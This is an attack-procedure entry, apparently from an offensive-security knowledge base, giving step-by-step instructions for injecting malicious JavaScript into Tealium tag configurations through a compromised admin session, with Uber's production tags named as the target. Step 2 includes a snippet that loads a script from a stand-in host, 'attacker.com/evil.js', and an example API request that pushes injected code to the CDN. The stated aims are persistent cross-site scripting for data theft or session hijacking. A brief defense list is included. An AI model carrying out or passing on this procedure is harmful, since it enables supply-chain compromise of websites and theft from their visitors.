---
id: proc-tealium-js-inject-001
tags:
  - javascript-injection
  - tealium
  - xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.371Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-into-Tealium-Tags

## Summary

Using a compromised Tealium admin account, this procedure injects arbitrary JavaScript into tag configurations hosted on Tealium's CDN, setting up stored XSS attacks when loaded by client sites like Uber.

## Description

Tealium tags are JavaScript snippets managed via their platform and served from `https://tags.tiqcdn.com/utag/{account}/*`. With admin access, attackers can edit these without sanitization, embedding payloads that execute in the context of integrating sites. This targets Uber's implementation where tags are loaded on multiple domains. Prerequisites: Compromised admin session. Outcomes: Persistent XSS payloads deployed globally.

## Requirements

1. Active Tealium admin session from prior compromise.
2. Knowledge of target account paths (e.g., uber tags).
3. Web browser or API client to submit tag updates.

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all tag code submissions, rejecting unsanitized JS.
- Implement code review workflows for tag changes.
- Monitor CDN deployments for anomalous script content via static analysis tools.

## Objectives

1. Embed malicious JS in production tags.
2. Ensure payloads persist and load on client sites.
3. Enable client-side execution for data theft or hijacking.

## Instructions

### Step 1: Access Tag Management

**Context**: Log into the Tealium admin panel and navigate to tag editing for the target account.

Use the compromised session to go to the "Tags" section and select paths like `/utag/uber/prod`.

### Step 2: Modify Tag Code

**Context**: Inject the payload into the tag's JavaScript content.

Edit the tag source to append malicious code, e.g., `var payload = document.createElement('script'); payload.src = 'https://attacker.com/evil.js'; document.head.appendChild(payload);`. Save and deploy the tag.

For example, update via the UI or API:

```http
POST /api/tags/uber/prod HTTP/1.1
Host: platform.tealium.com
Content-Type: application/json
Authorization: Bearer [admin_token]

{"code": "// Original code\n<script>malicious code here</script>"}
```

> Deployment updates the CDN file instantly. Verify by curling the tag URL.

### Step 3: Validate Injection

**Context**: Confirm the payload is live on the CDN.

Fetch `https://tags.tiqcdn.com/utag/uber/prod.js` and inspect for the injected code.

**Expected Output**: Modified JS file containing the payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[javascript-injection]]
- [[tealium]]
- [[xss]]
